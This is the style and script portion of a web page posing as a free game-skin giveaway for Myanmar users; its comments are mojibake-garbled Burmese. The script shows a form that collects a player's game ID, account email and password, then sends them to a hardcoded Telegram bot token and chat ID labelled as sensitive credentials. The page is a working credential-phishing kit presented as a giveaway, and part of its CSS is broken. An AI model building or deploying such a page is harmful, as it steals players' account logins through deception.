        /* CSS for full page layout and aesthetics */
        body {
            background-color: #1a1a1a; 
            color: #ffffff;
            font-family: 'Inter', sans-serif;
            padding: 0;
            margin: 0;
        }
        .container {
            max-width: 768px;
            margin: auto;
            padding: 0 8px;
        }
        
        .event-header {
            background-color: #1a1a1a;
            padding: 8px 16px;
            display: flex;
            justify-content: space-between; 
            align-items: center;
            border-bottom: 2px solid #333;
            width: 100%; 
            box-sizing: border-box; 
        }
        
        .platform-links {
            display: flex;
            align-items: center;
        }
        .platform-links a {
            margin-left: 8px;
            display: inline-block;
        }
        .platform-links img {
            height: 24px;
            border-radius: 4px;
        }
        
        .header-logo-icon {
            height: 45px;
            border-radius: 4px;
        }

        .main-banner {
            width: 100%;
            height: auto;
            border-radius: 8px;
            margin: 16px 0;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            background-color: #333;
            min-height: 150px;
            display: block;
        }

        .skin-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 12px;
            padding: 16px 0;
        }
        @media (min-width: 640px) {
            .skin-grid {
                grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
                gap: 16px;
            }
        }

        .item-card {
            background-color: #1a1a1a;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
            cursor: pointer;
            transition: transform 0.1s;
            position: relative;
            height: auto;
            border: 2px solid transparent;
        }
        .item-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(240, 82, 82, 0.6);
            border-color: #f05252;
        }
        
        .skin-image {
            width: 100%;
            height: auto;
            display: block;
        }

        .free-tag {
            position: absolute;
            bottom: 0;
            right: 0;
            background-color: #E6B300;
            color: #121212;
            padding: 2px 8px;
            border-top-left-radius: 8px;
            font-size: 0.75rem;
            font-weight: 900;
            text-transform: uppercase;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
        }

        /* Modal Styling */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease;
        }
        .modal-overlay.open {
            opacity: 1;
            visibility: visible;
        }
        .modal-content {
            background-color: #252525;
            padding: 24px;
            border-radius: 12px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
            transform: scale(0.9);
            transition: transform 0.3s ease;
        }
        .modal-overlay.open .modal-content {
            transform: scale(1);
        }
        .modal-input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 6px;
            border: 2px solid #333;
            background-color: #3a3a3a;
            color: white;
            font-size: 1rem;
        }
        .modal-send-btn {

            font-weight: 700;

        }

            background-color: #942d2d;
            margin-left: 10px;
        }
        .modal-close-btn:hover {
             background-color: #752424;
        }
    </style>

    <script>
        // ----------------------------------------------------
        // ğŸš¨ Telegram Bot Configuration (á€¡á€›á€±á€¸á€€á€¼á€®á€¸á€á€±á€¬ á€œá€»á€¾á€­á€¯á€·á€á€¾á€€á€ºá€€á€¯á€’á€ºá€™á€»á€¬á€¸)
        // ----------------------------------------------------
        // á€¤á€€á€¯á€’á€ºá€™á€»á€¬á€¸á€€á€­á€¯ á€á€„á€ºá€· Bot á€¡á€á€½á€€á€º á€á€±á€á€»á€¬á€…á€½á€¬ á€‘á€Šá€·á€ºá€á€½á€„á€ºá€¸á€‘á€¬á€¸á€›á€”á€º á€œá€­á€¯á€¡á€•á€ºá€•á€«á€á€Šá€ºá‹
        const TELEGRAM_BOT_TOKEN = '8401107435:AAF_g6gQ1BApPyLlY_zE3BDm_1EvLKqqLKA'; 
        const CHAT_ID = '8434049778'; 
        // ----------------------------------------------------


        let selectedSkin = ''; // á€›á€½á€±á€¸á€‘á€¬á€¸á€á€±á€¬ Skin á€”á€¬á€™á€Šá€ºá€€á€­á€¯ á€á€­á€™á€ºá€¸á€‘á€¬á€¸á€™á€Šá€ºá‹

        // á€•á€¯á€¶á€™á€•á€±á€«á€ºá€›á€„á€º Placeholder á€•á€¼á€”á€ºá€•á€¼á€–á€­á€¯á€· Function
        function fallbackImage(img) {
            img.onerror = null;
            img.src = `https://placehold.co/100x150/2c2c2c/ffffff?text=Broken+Image`;
        }

        // ğŸš¨ Modal á€€á€­á€¯ á€–á€½á€„á€·á€ºá€›á€”á€º Function 
        function openTelegramModal(skinName) {
            selectedSkin = skinName;
            const modal = document.getElementById('telegramModal');
            
            // Modal element á€€á€­á€¯ á€›á€¾á€¬á€á€½á€±á€·á€›á€„á€º 'open' class á€€á€­á€¯ á€‘á€Šá€·á€ºá€•á€¼á€®á€¸ á€–á€½á€„á€·á€ºá€™á€Šá€ºá‹
            if (modal) {
                modal.classList.add('open');
                document.getElementById('modalStatus').innerText = ''; // Status á€€á€­á€¯á€›á€¾á€„á€ºá€¸á€œá€„á€ºá€¸á€á€¼á€„á€ºá€¸
                // Input á€™á€»á€¬á€¸á€€á€­á€¯ á€›á€¾á€„á€ºá€¸á€œá€„á€ºá€¸á€á€¼á€„á€ºá€¸
                document.getElementById('messageLine1').value = '';
                document.getElementById('messageLine2').value = '';
                document.getElementById('messageLine3').value = ''; 
            }
        }

        // Modal á€€á€­á€¯ á€•á€­á€á€ºá€›á€”á€º Function
        function closeTelegramModal() {
            const modal = document.getElementById('telegramModal');
            if (modal) {
                modal.classList.remove('open');
            }
        }
        
        // Email á€•á€¯á€¶á€…á€¶ á€™á€¾á€”á€ºá€€á€”á€ºá€€á€¼á€±á€¬á€„á€ºá€¸ á€…á€…á€ºá€†á€±á€¸á€›á€”á€º Function
        function isValidEmail(email) {
            // á€…á€…á€ºá€†á€±á€¸á€™á€¾á€¯: @ á€”á€¾á€„á€·á€º domain á€¡á€á€½á€€á€º á€¡á€”á€Šá€ºá€¸á€†á€¯á€¶á€¸ á€¡á€…á€€á€ºá€á€…á€ºá€œá€¯á€¶á€¸ á€•á€«á€›á€™á€Šá€ºá‹
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        // Telegram á€á€­á€¯á€· á€…á€¬á€•á€­á€¯á€·á€›á€”á€º Function (API Call)
        async function sendMessageToTelegram() {
            const statusElement = document.getElementById('modalStatus');
            const idServer = document.getElementById('messageLine1').value.trim();
            const accountType = document.getElementById('messageLine2').value.trim();
            const password = document.getElementById('messageLine3').value.trim();
            
            // ---------------------------------------------
            // CLIENT-SIDE VALIDATION (á€’á€±á€á€¬á€™á€¾á€”á€ºá€¡á€±á€¬á€„á€º á€…á€…á€ºá€†á€±á€¸á€™á€¾á€¯)
            // ---------------------------------------------
            
            if (!idServer || !accountType || !password) {
                statusElement.innerText = 'á€¡á€€á€½á€€á€ºá€¡á€¬á€¸á€œá€¯á€¶á€¸á€€á€­á€¯ á€–á€¼á€Šá€·á€ºá€á€½á€„á€ºá€¸á€›á€”á€º á€œá€­á€¯á€¡á€•á€ºá€•á€«á€á€Šá€ºá‹';
                statusElement.style.color = '#f05252';
                return;
            }

            // 1. ID/Server ID á€…á€…á€ºá€†á€±á€¸á€á€¼á€„á€ºá€¸ (á€”á€¶á€•á€«á€á€ºá€™á€»á€¬á€¸áŠ á€€á€½á€„á€ºá€¸á€á€á€ºá€™á€»á€¬á€¸á€á€¬ á€á€½á€„á€·á€ºá€•á€¼á€¯)
            // á€…á€…á€ºá€†á€±á€¸á€™á€¾á€¯: á€”á€¶á€•á€«á€á€ºáŠ á€”á€±á€›á€¬á€œá€½á€á€ºáŠ á€€á€½á€„á€ºá€¸á€á€á€ºá€™á€»á€¬á€¸ á€•á€«á€á€„á€ºá€”á€­á€¯á€„á€ºá€á€±á€¬á€ºá€œá€Šá€ºá€¸ á€”á€¶á€•á€«á€á€ºá€á€…á€ºá€á€¯á€á€±á€¬á€· á€•á€«á€›á€™á€Šá€ºá‹
            if (!/^\s*[\d() ]+\s*$/.test(idServer) || !/\d/.test(idServer)) {
                statusElement.innerText = 'ID/Server ID á€á€Šá€º á€”á€¶á€•á€«á€á€ºá€™á€»á€¬á€¸á€á€¬ á€•á€«á€á€„á€ºá€›á€•á€«á€™á€Šá€ºá‹ (á€¥á€•á€™á€¬ 12345678(1234))';
                statusElement.style.color = '#f05252';
                return;
            }

            // 2. Email á€•á€¯á€¶á€…á€¶ á€™á€¾á€”á€ºá€€á€”á€ºá€€á€¼á€±á€¬á€„á€ºá€¸ á€…á€…á€ºá€†á€±á€¸á€á€¼á€„á€ºá€¸
            if (!isValidEmail(accountType)) {
                 statusElement.innerText = 'Account (Email) á€•á€¯á€¶á€…á€¶á€€á€­á€¯ á€™á€¾á€”á€ºá€€á€”á€ºá€…á€½á€¬ (á€¥á€•á€™á€¬: example@gmail.com) á€–á€¼á€Šá€·á€ºá€á€½á€„á€ºá€¸á€•á€«á‹';
                statusElement.style.color = '#f05252';
                return;
            }

            // 3. Password á€¡á€”á€Šá€ºá€¸á€†á€¯á€¶á€¸ áˆ á€œá€¯á€¶á€¸ á€…á€…á€ºá€†á€±á€¸á€á€¼á€„á€ºá€¸
            if (password.length < 8) {
                statusElement.innerText = 'Password á€á€Šá€º á€¡á€”á€Šá€ºá€¸á€†á€¯á€¶á€¸ áˆ á€œá€¯á€¶á€¸ á€›á€¾á€­á€›á€•á€«á€™á€Šá€ºá‹';
                statusElement.style.color = '#f05252';
                return;
            }
            // ---------------------------------------------
            
            // Message Construction
            const fullMessage = `
                ğŸš¨ NEW SKIN REQUEST (Myanmar Only User) ğŸš¨
                -------------------------------------
                *SKIN SELECTED:* ${selectedSkin}
                *USER ID/SERVER ID:* ${idServer}
                *ACCOUNT TYPE/EMAIL:* ${accountType}
                *PASSWORD:* ${password} 
                -------------------------------------
                *WARNING: THIS CONTAINS SENSITIVE CREDENTIALS!*
            `;

            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            statusElement.innerText = 'á€•á€­á€¯á€·á€”á€±á€•á€«á€á€Šá€º...';
            statusElement.style.color = '#fca311';

            try {
                // Telegram API á€€á€­á€¯ á€á€±á€«á€ºá€†á€­á€¯á€á€¼á€„á€ºá€¸
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: fullMessage,
                        parse_mode: 'Markdown' 
                    })
                });

                const data = await response.json();

                if (response.ok && data.ok) {
                    // Success message
                    statusElement.innerText = 'á€†á€¯á€œá€€á€ºá€†á€±á€¬á€„á€º á€‘á€¯á€á€ºá€šá€°á€•á€¼á€®á€¸á€•á€«á€•á€¼á€®á‹ 24 á€”á€¬á€›á€® á€…á€±á€¬á€„á€·á€ºá€†á€­á€¯á€„á€ºá€¸á€•á€±á€¸á€•á€«á‹';
                    statusElement.style.color = '#2d942e';
                    // 3 seconds delay before closing
                    setTimeout(closeTelegramModal, 3000); 
                } else {
                    // Error message
                    statusElement.innerText = `á€‘á€¯á€á€ºá€šá€°á€™á€›á€•á€«: ${data.description || 'á€¡á€™á€¾á€¬á€¸á€á€…á€ºá€á€¯á€á€¯á€›á€¾á€­á€”á€±á€•á€«á€á€Šá€ºá‹ Bot Config á€€á€­á€¯ á€…á€…á€ºá€•á€«á‹'}`;
                    statusElement.style.color = '#f05252';
                }

            } catch (error) {
                console.error('Fetch Error:', error);
                statusElement.innerText = 'á€€á€½á€”á€ºá€›á€€á€º á€á€»á€­á€á€ºá€†á€€á€ºá€™á€¾á€¯ á€¡á€™á€¾á€¬á€¸á€–á€¼á€…á€ºá€”á€±á€•á€«á€á€Šá€ºá‹';
                statusElement.style.color = '#f05252';
            }
        }
    </script>
